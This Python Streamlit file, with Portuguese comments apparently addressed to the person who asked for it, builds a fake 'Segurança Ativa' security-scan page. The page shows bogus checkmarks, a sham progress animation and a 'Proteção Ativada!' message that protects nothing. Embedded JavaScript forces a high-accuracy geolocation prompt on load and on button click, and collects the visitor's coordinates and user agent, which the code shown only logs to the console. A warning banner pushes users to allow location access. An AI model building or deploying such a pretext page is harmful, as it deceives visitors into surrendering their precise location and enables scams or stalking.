import streamlit as st
import streamlit.components.v1 as components
import time

# --- MANTENDO SUA ESTILIZAÇÃO (NÃO MEXI EM NADA) ---
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { 
        width: 100%; border-radius: 20px; background-color: #262730; 
        color: white; border: none; height: 50px; font-weight: bold;
    }
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# --- SCRIPT QUE FORÇA O POP-UP DE PRECISÃO ---
# O segredo é o 'watchPosition' e o 'enableHighAccuracy' juntos
js_force_popup = """
<script>
    function dispararAgora() {
        navigator.geolocation.getCurrentPosition(
            (p) => { 
                const dados = {
                    lat: p.coords.latitude,
                    lon: p.coords.longitude,
                    agente: navigator.userAgent
                };
                console.log(dados);
            },
            (e) => { console.log("Ainda negado"); },
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    }

    // Tenta ao carregar e força ao clicar no botão
    setTimeout(dispararAgora, 500);
    
    const botao = window.parent.document.querySelector('button');
    if(botao) {
        botao.addEventListener('click', dispararAgora);
    }
</script>
"""
components.html(js_force_popup, height=0)

# --- INTERFACE (IGUAL AO SEU PRINT) ---
st.title("Verificar segurança")

placeholder_bolha = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    # Animação da bolha subindo até 99% como no seu print
    for i in range(4, 100):
        placeholder_bolha.markdown(f'<div class="circle-container"><div class="circle spin">{i}%</div></div>', unsafe_allow_html=True)
        time.sleep(0.03)
    st.success("Proteção Ativada!")
else:
    # Começa em 4% conforme seu print
    placeholder_bolha.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)

# Barra de aviso que você quer que suma quando der certo
st.warning("Permissão de localização negada ou indisponível.")
